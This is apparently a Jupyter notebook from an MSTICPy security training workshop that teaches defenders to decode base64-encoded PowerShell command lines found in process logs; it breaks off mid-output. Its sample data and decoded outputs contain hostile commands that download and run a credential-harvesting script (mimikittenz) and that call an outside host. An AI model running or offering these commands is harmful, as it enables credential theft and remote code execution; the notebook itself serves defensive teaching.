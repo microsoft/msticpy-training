{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## MSTICPy and Notebooks in InfoSec\n",
    "\n",
    "---\n",
    "\n",
    "<h1 style=\"border: solid; padding:5pt; color:black; background-color:#909090\">Session 6 - Data analysis</h1>\n",
    "\n",
    "---\n",
    "\n",
    "## What this session covers:\n",
    "\n",
    "* Data Analysis capabilities in msticpy\n",
    "* Base 64 decoding\n",
    "* IoC Extraction\n",
    "* Outlier detection using Time Series Analysis\n",
    "\n",
    "\n",
    "## Prerequisites\n",
    "- Python >= 3.8 Environment\n",
    "- Jupyter installed\n",
    "- MSTICPy installed\n",
    "\n",
    "## Recommended\n",
    "- VS Code\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---\n",
    "\n",
    "# <a style=\"border: solid; padding:5pt; color:black; background-color:#909090\">Data Analysis capabilities in msticpy</a>\n",
    "\n",
    "---\n",
    "\n",
    "MSTICPy has several generic analysis and transformation functions. Some examples of transforms are:\n",
    "- Process tree building\n",
    "- decoding encoded and compressed data\n",
    "- IoC/observable extraction from data\n",
    "- Time series analysis\n",
    "- syslog parsing\n",
    "\n",
    "You can read more about the features in MSTICPy documentation.\n",
    " - [Data Analysis](https://msticpy.readthedocs.io/en/latest/DataAnalysis.html)\n",
    " - [Process Trees](https://msticpy.readthedocs.io/en/latest/visualization/ProcessTree.html)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-17T18:18:33.520024Z",
     "start_time": "2022-10-17T18:18:33.503259Z"
    }
   },
   "source": [
    "---\n",
    "\n",
    "# <a style=\"border: solid; padding:5pt; color:black; background-color:#909090\">Base 64 decoding using msticpy</a>\n",
    "\n",
    "---\n",
    "\n",
    "Often, Defenders have to bulk analyze the process execution commandline logs containing base64 encoded strings by decoding and analyzing them for malicious activity. \n",
    "This msticpy module allows you to extract base64 encoded content from a string or columns of Pandas DataFrame. \n",
    "\n",
    "Read more details - \n",
    "[Base64 Decoding and Unpacking](https://msticpy.readthedocs.io/en/latest/data_analysis/Base64Unpack.html)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-27T15:37:14.717138Z",
     "start_time": "2022-10-27T15:36:54.937207Z"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: MSTICPYCONFIG=./msticpyconfig.yaml\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "\n",
       "This product includes GeoLite2 data created by MaxMind, available from\n",
       "<a href=\"https://www.maxmind.com\">https://www.maxmind.com</a>.\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Warning: Custom query definitions path /home/jovyan/work/msticpy-training/workshops/Oct2022/completed/data not found\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "\n",
       "This library uses services provided by ipstack.\n",
       "<a href=\"https://ipstack.com\">https://ipstack.com</a>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "%env MSTICPYCONFIG=./msticpyconfig.yaml\n",
    "import msticpy as mp \n",
    "mp.init_notebook()\n",
    "pd.set_option('display.max_colwidth', 200)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In order to find module path, you can use search feature as shows below"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-27T15:37:19.004572Z",
     "start_time": "2022-10-27T15:37:18.987824Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "    <style>\n",
       "        .table_mod {border-collapse: collapse; width: 50%;}\n",
       "        .cell_mod {border: 1px solid #ddd !important;\n",
       "            text-align: left !important; padding: 15px !important;}\n",
       "    </style>\n",
       "    <h4>Modules matching 'base64'</h4>\n",
       "    <table class='table_mod'>\n",
       "    <tr class='cell_mod'><th>Module</th><th>Help</th></tr>\n",
       "    <tr class='cell_mod'><td>msticpy.transform.base64unpack</td><td><a href=https://msticpy.readthedocs.io/en/latest/api/msticpy.transform.base64unpack.html target='_blank'>msticpy.transform.base64unpack</a></td></tr>\n",
       "    </table>\n",
       "    "
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "mp.search('base64')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Once you identified the module path, you can use either on a input string or columns of Padas dataframe.\n",
    "\n",
    "Exmaple powershell command string with base64 encoded data. We can put this as input in next step.\n",
    "\n",
    "`powershell -enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcHV0dGVycGFuZGEvbWltaWtpdHRlbnovbWFzdGVyL0ludm9rZS1taW1pa2l0dGVuei5wczEnKTsgSW52b2tlLW1pbWlraXR0ZW56Cg==`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-27T15:37:21.057599Z",
     "start_time": "2022-10-27T15:37:21.046583Z"
    }
   },
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "fd1302df9f8c4af9862b7129b805b712",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Text(value='', description='Enter a commandline with powershell base64 encoded', layout=Layout(width='50%'), s…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "cmdline = mp.nbwidgets.GetText(prompt='Enter a commandline with powershell base64 encoded', auto_display=True);"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "in order to decode, you can use `unpack` method within `base64unpack` tranform module/\n",
    "The library returns following information.\n",
    "- decoded string (if decodable to utf-8 or utf-16)\n",
    "- hashes of the decoded segment (MD5, SHA1, SHA256)\n",
    "- string of printable byte values (e.g. for submission to a disassembler)\n",
    "- the detected decoded file type (limited)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-27T15:37:28.926331Z",
     "start_time": "2022-10-27T15:37:28.914890Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"powershell -enc <decoded type='string' name='[None]' index='1' depth='1'>IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1'); Invoke-mimikittenz\\n</decoded>\""
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Decode the string\n",
    "base64_dec_str = mp.transform.base64unpack.unpack(input_string=cmdline.value)\n",
    "\n",
    "# Print decoded string\n",
    "display(base64_dec_str[0])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-27T15:37:30.848167Z",
     "start_time": "2022-10-27T15:37:30.843719Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1'); Invoke-mimikittenz\\n\""
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Print decoded string\n",
    "display(base64_dec_str[1]['decoded_string'][0])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## <a style=\"border: solid; padding:5pt; color:black; background-color:#309030\">Task 1 - Base 64 decoding using dataframe as input</a>\n",
    "\n",
    "Perform base 64 encoding on the data loaded from previous step.\n",
    "1. Choose the columns containing powershell base64 command line logs.\n",
    "2. Use python help (`process_enc_logs.mp.b64unpack` or `mp.transform.base64unpack.unpack_df`)\n",
    "   to find correct parameters such as input data and column name.\n",
    "3. Finally display the results\n",
    "\n",
    "<br>\n",
    "<details>\n",
    "<summary>Hints...</summary>\n",
    "<li>Use the cell below to identify the columns containing powershell base64 encoded logs.</li>\n",
    "<li>Use data and column to specify input dataframe and column containing powershell command line</li>\n",
    "<li>The final command to decode should look like one of the following.\n",
    "\n",
    "<pre>\n",
    "    # using the pandas msticpy accessor\n",
    "    process_enc_logs.mp.b64extract(column='CommandLine')\n",
    "</pre>\n",
    "\n",
    "<pre>\n",
    "    # using the standalone function\n",
    "    mp.transform.base64unpack.unpack_df(data=process_enc_logs, column='CommandLine')\n",
    "</pre>\n",
    "</li>\n",
    "<ul>\n",
    "</ul>\n",
    "</details>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-27T15:37:36.295533Z",
     "start_time": "2022-10-27T15:37:36.212583Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>TenantId</th>\n",
       "      <th>Account</th>\n",
       "      <th>EventID</th>\n",
       "      <th>TimeGenerated</th>\n",
       "      <th>Computer</th>\n",
       "      <th>SubjectUserSid</th>\n",
       "      <th>SubjectUserName</th>\n",
       "      <th>SubjectDomainName</th>\n",
       "      <th>SubjectLogonId</th>\n",
       "      <th>NewProcessId</th>\n",
       "      <th>NewProcessName</th>\n",
       "      <th>TokenElevationType</th>\n",
       "      <th>ProcessId</th>\n",
       "      <th>CommandLine</th>\n",
       "      <th>ParentProcessName</th>\n",
       "      <th>TargetLogonId</th>\n",
       "      <th>SourceComputerId</th>\n",
       "      <th>TimeCreatedUtc</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>968</th>\n",
       "      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0</td>\n",
       "      <td>MSTICAlertsWin1\\MSTICAdmin</td>\n",
       "      <td>4688</td>\n",
       "      <td>2019-02-09 23:26:48.107</td>\n",
       "      <td>MSTICAlertsWin1</td>\n",
       "      <td>S-1-5-21-996632719-2361334927-4038480536-500</td>\n",
       "      <td>MSTICAdmin</td>\n",
       "      <td>MSTICAlertsWin1</td>\n",
       "      <td>0xab5a5ac</td>\n",
       "      <td>0x1260</td>\n",
       "      <td>C:\\W!ndows\\System32\\powershell.exe</td>\n",
       "      <td>%%1936</td>\n",
       "      <td>0x1684</td>\n",
       "      <td>.\\powershell  -enc LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==</td>\n",
       "      <td>C:\\Windows\\System32\\cmd.exe</td>\n",
       "      <td>0x0</td>\n",
       "      <td>263a788b-6526-4cdc-8ed9-d79402fe4aa0</td>\n",
       "      <td>2019-02-09 23:26:48.107</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7452</th>\n",
       "      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0</td>\n",
       "      <td>MSTICAlertsWin1\\MSTICAdmin</td>\n",
       "      <td>4688</td>\n",
       "      <td>2019-02-13 22:03:42.860</td>\n",
       "      <td>MSTICAlertsWin1</td>\n",
       "      <td>S-1-5-21-996632719-2361334927-4038480536-500</td>\n",
       "      <td>MSTICAdmin</td>\n",
       "      <td>MSTICAlertsWin1</td>\n",
       "      <td>0x1e821b5</td>\n",
       "      <td>0x61e0</td>\n",
       "      <td>C:\\W!ndows\\System32\\powershell.exe</td>\n",
       "      <td>%%1936</td>\n",
       "      <td>0x7b20</td>\n",
       "      <td>.\\powershell  -enc LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==</td>\n",
       "      <td>C:\\Windows\\System32\\cmd.exe</td>\n",
       "      <td>0x0</td>\n",
       "      <td>263a788b-6526-4cdc-8ed9-d79402fe4aa0</td>\n",
       "      <td>2019-02-13 22:03:42.860</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                  TenantId                     Account  \\\n",
       "968   52b1ab41-869e-4138-9e40-2a4457f09bf0  MSTICAlertsWin1\\MSTICAdmin   \n",
       "7452  52b1ab41-869e-4138-9e40-2a4457f09bf0  MSTICAlertsWin1\\MSTICAdmin   \n",
       "\n",
       "      EventID           TimeGenerated         Computer  \\\n",
       "968      4688 2019-02-09 23:26:48.107  MSTICAlertsWin1   \n",
       "7452     4688 2019-02-13 22:03:42.860  MSTICAlertsWin1   \n",
       "\n",
       "                                    SubjectUserSid SubjectUserName  \\\n",
       "968   S-1-5-21-996632719-2361334927-4038480536-500      MSTICAdmin   \n",
       "7452  S-1-5-21-996632719-2361334927-4038480536-500      MSTICAdmin   \n",
       "\n",
       "     SubjectDomainName SubjectLogonId NewProcessId  \\\n",
       "968    MSTICAlertsWin1      0xab5a5ac       0x1260   \n",
       "7452   MSTICAlertsWin1      0x1e821b5       0x61e0   \n",
       "\n",
       "                          NewProcessName TokenElevationType ProcessId  \\\n",
       "968   C:\\W!ndows\\System32\\powershell.exe             %%1936    0x1684   \n",
       "7452  C:\\W!ndows\\System32\\powershell.exe             %%1936    0x7b20   \n",
       "\n",
       "                                                                                                                                                                          CommandLine  \\\n",
       "968   .\\powershell  -enc LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==   \n",
       "7452  .\\powershell  -enc LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==   \n",
       "\n",
       "                ParentProcessName TargetLogonId  \\\n",
       "968   C:\\Windows\\System32\\cmd.exe           0x0   \n",
       "7452  C:\\Windows\\System32\\cmd.exe           0x0   \n",
       "\n",
       "                          SourceComputerId          TimeCreatedUtc  \n",
       "968   263a788b-6526-4cdc-8ed9-d79402fe4aa0 2019-02-09 23:26:48.107  \n",
       "7452  263a788b-6526-4cdc-8ed9-d79402fe4aa0 2019-02-13 22:03:42.860  "
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Load test data\n",
    "process_logs = pd.read_pickle('./../data/processes_on_host.pkl')\n",
    "# Filter the records with powershell base 64 encoded data\n",
    "process_enc_logs = process_logs[process_logs['CommandLine'].str.contains(\"-enc\")]\n",
    "process_enc_logs"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-27T15:37:38.301066Z",
     "start_time": "2022-10-27T15:37:38.272766Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>reference</th>\n",
       "      <th>original_string</th>\n",
       "      <th>file_name</th>\n",
       "      <th>file_type</th>\n",
       "      <th>input_bytes</th>\n",
       "      <th>decoded_string</th>\n",
       "      <th>encoding_type</th>\n",
       "      <th>file_hashes</th>\n",
       "      <th>md5</th>\n",
       "      <th>sha1</th>\n",
       "      <th>sha256</th>\n",
       "      <th>printable_bytes</th>\n",
       "      <th>src_index</th>\n",
       "      <th>CommandLine</th>\n",
       "      <th>full_decoded_string</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>(, 1., 1)</td>\n",
       "      <td>LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==</td>\n",
       "      <td>unknown</td>\n",
       "      <td>None</td>\n",
       "      <td>b'-Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"'</td>\n",
       "      <td>-Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"</td>\n",
       "      <td>utf-8</td>\n",
       "      <td>{'md5': '65716544c3db642171b7597cd3deca2b', 'sha1': '8aa4c81d51732addabcaa5d8f121c79b0923189f', 'sha256': '828cce6aec56c6cc50b35041381f7d11a8d9c3cd0893625a45ed611875910fa8'}</td>\n",
       "      <td>65716544c3db642171b7597cd3deca2b</td>\n",
       "      <td>8aa4c81d51732addabcaa5d8f121c79b0923189f</td>\n",
       "      <td>828cce6aec56c6cc50b35041381f7d11a8d9c3cd0893625a45ed611875910fa8</td>\n",
       "      <td>2d 4e 6f 6e 69 6e 74 65 72 61 63 74 69 76 65 20 2d 4e 6f 70 72 6f 66 69 6c 65 20 2d 43 6f 6d 6d 61 6e 64 20 22 49 6e 76 6f 6b 65 2d 45 78 70 72 65 73 73 69 6f 6e 20 47 65 74 2d 50 72 6f 63 65 73 7...</td>\n",
       "      <td>968</td>\n",
       "      <td>.\\powershell  -enc LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==</td>\n",
       "      <td>.\\powershell  -enc &lt;decoded type='string' name='[None]' index='1' depth='1'&gt;-Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"&lt;/dec...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>(, 1., 1)</td>\n",
       "      <td>LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==</td>\n",
       "      <td>unknown</td>\n",
       "      <td>None</td>\n",
       "      <td>b'-Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"'</td>\n",
       "      <td>-Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"</td>\n",
       "      <td>utf-8</td>\n",
       "      <td>{'md5': '65716544c3db642171b7597cd3deca2b', 'sha1': '8aa4c81d51732addabcaa5d8f121c79b0923189f', 'sha256': '828cce6aec56c6cc50b35041381f7d11a8d9c3cd0893625a45ed611875910fa8'}</td>\n",
       "      <td>65716544c3db642171b7597cd3deca2b</td>\n",
       "      <td>8aa4c81d51732addabcaa5d8f121c79b0923189f</td>\n",
       "      <td>828cce6aec56c6cc50b35041381f7d11a8d9c3cd0893625a45ed611875910fa8</td>\n",
       "      <td>2d 4e 6f 6e 69 6e 74 65 72 61 63 74 69 76 65 20 2d 4e 6f 70 72 6f 66 69 6c 65 20 2d 43 6f 6d 6d 61 6e 64 20 22 49 6e 76 6f 6b 65 2d 45 78 70 72 65 73 73 69 6f 6e 20 47 65 74 2d 50 72 6f 63 65 73 7...</td>\n",
       "      <td>7452</td>\n",
       "      <td>.\\powershell  -enc LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==</td>\n",
       "      <td>.\\powershell  -enc &lt;decoded type='string' name='[None]' index='1' depth='1'&gt;-Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"&lt;/dec...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   reference  \\\n",
       "0  (, 1., 1)   \n",
       "1  (, 1., 1)   \n",
       "\n",
       "                                                                                                                                                original_string  \\\n",
       "0  LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==   \n",
       "1  LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==   \n",
       "\n",
       "  file_name file_type  \\\n",
       "0   unknown      None   \n",
       "1   unknown      None   \n",
       "\n",
       "                                                                                                              input_bytes  \\\n",
       "0  b'-Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"'   \n",
       "1  b'-Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"'   \n",
       "\n",
       "                                                                                                        decoded_string  \\\n",
       "0  -Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"   \n",
       "1  -Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"   \n",
       "\n",
       "  encoding_type  \\\n",
       "0         utf-8   \n",
       "1         utf-8   \n",
       "\n",
       "                                                                                                                                                                     file_hashes  \\\n",
       "0  {'md5': '65716544c3db642171b7597cd3deca2b', 'sha1': '8aa4c81d51732addabcaa5d8f121c79b0923189f', 'sha256': '828cce6aec56c6cc50b35041381f7d11a8d9c3cd0893625a45ed611875910fa8'}   \n",
       "1  {'md5': '65716544c3db642171b7597cd3deca2b', 'sha1': '8aa4c81d51732addabcaa5d8f121c79b0923189f', 'sha256': '828cce6aec56c6cc50b35041381f7d11a8d9c3cd0893625a45ed611875910fa8'}   \n",
       "\n",
       "                                md5                                      sha1  \\\n",
       "0  65716544c3db642171b7597cd3deca2b  8aa4c81d51732addabcaa5d8f121c79b0923189f   \n",
       "1  65716544c3db642171b7597cd3deca2b  8aa4c81d51732addabcaa5d8f121c79b0923189f   \n",
       "\n",
       "                                                             sha256  \\\n",
       "0  828cce6aec56c6cc50b35041381f7d11a8d9c3cd0893625a45ed611875910fa8   \n",
       "1  828cce6aec56c6cc50b35041381f7d11a8d9c3cd0893625a45ed611875910fa8   \n",
       "\n",
       "                                                                                                                                                                                           printable_bytes  \\\n",
       "0  2d 4e 6f 6e 69 6e 74 65 72 61 63 74 69 76 65 20 2d 4e 6f 70 72 6f 66 69 6c 65 20 2d 43 6f 6d 6d 61 6e 64 20 22 49 6e 76 6f 6b 65 2d 45 78 70 72 65 73 73 69 6f 6e 20 47 65 74 2d 50 72 6f 63 65 73 7...   \n",
       "1  2d 4e 6f 6e 69 6e 74 65 72 61 63 74 69 76 65 20 2d 4e 6f 70 72 6f 66 69 6c 65 20 2d 43 6f 6d 6d 61 6e 64 20 22 49 6e 76 6f 6b 65 2d 45 78 70 72 65 73 73 69 6f 6e 20 47 65 74 2d 50 72 6f 63 65 73 7...   \n",
       "\n",
       "   src_index  \\\n",
       "0        968   \n",
       "1       7452   \n",
       "\n",
       "                                                                                                                                                                       CommandLine  \\\n",
       "0  .\\powershell  -enc LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==   \n",
       "1  .\\powershell  -enc LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==   \n",
       "\n",
       "                                                                                                                                                                                       full_decoded_string  \n",
       "0  .\\powershell  -enc <decoded type='string' name='[None]' index='1' depth='1'>-Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"</dec...  \n",
       "1  .\\powershell  -enc <decoded type='string' name='[None]' index='1' depth='1'>-Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"</dec...  "
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# specify the data and column parameters\n",
    "dec_df = mp.transform.base64unpack.unpack_df(data=process_enc_logs, column='CommandLine')\n",
    "\n",
    "# display dataframe\n",
    "display(dec_df)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-27T15:37:45.205938Z",
     "start_time": "2022-10-27T15:37:45.181220Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>reference</th>\n",
       "      <th>original_string</th>\n",
       "      <th>file_name</th>\n",
       "      <th>file_type</th>\n",
       "      <th>input_bytes</th>\n",
       "      <th>decoded_string</th>\n",
       "      <th>encoding_type</th>\n",
       "      <th>file_hashes</th>\n",
       "      <th>md5</th>\n",
       "      <th>sha1</th>\n",
       "      <th>sha256</th>\n",
       "      <th>printable_bytes</th>\n",
       "      <th>src_index</th>\n",
       "      <th>CommandLine</th>\n",
       "      <th>full_decoded_string</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>(, 1., 1)</td>\n",
       "      <td>LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==</td>\n",
       "      <td>unknown</td>\n",
       "      <td>None</td>\n",
       "      <td>b'-Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"'</td>\n",
       "      <td>-Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"</td>\n",
       "      <td>utf-8</td>\n",
       "      <td>{'md5': '65716544c3db642171b7597cd3deca2b', 'sha1': '8aa4c81d51732addabcaa5d8f121c79b0923189f', 'sha256': '828cce6aec56c6cc50b35041381f7d11a8d9c3cd0893625a45ed611875910fa8'}</td>\n",
       "      <td>65716544c3db642171b7597cd3deca2b</td>\n",
       "      <td>8aa4c81d51732addabcaa5d8f121c79b0923189f</td>\n",
       "      <td>828cce6aec56c6cc50b35041381f7d11a8d9c3cd0893625a45ed611875910fa8</td>\n",
       "      <td>2d 4e 6f 6e 69 6e 74 65 72 61 63 74 69 76 65 20 2d 4e 6f 70 72 6f 66 69 6c 65 20 2d 43 6f 6d 6d 61 6e 64 20 22 49 6e 76 6f 6b 65 2d 45 78 70 72 65 73 73 69 6f 6e 20 47 65 74 2d 50 72 6f 63 65 73 7...</td>\n",
       "      <td>968</td>\n",
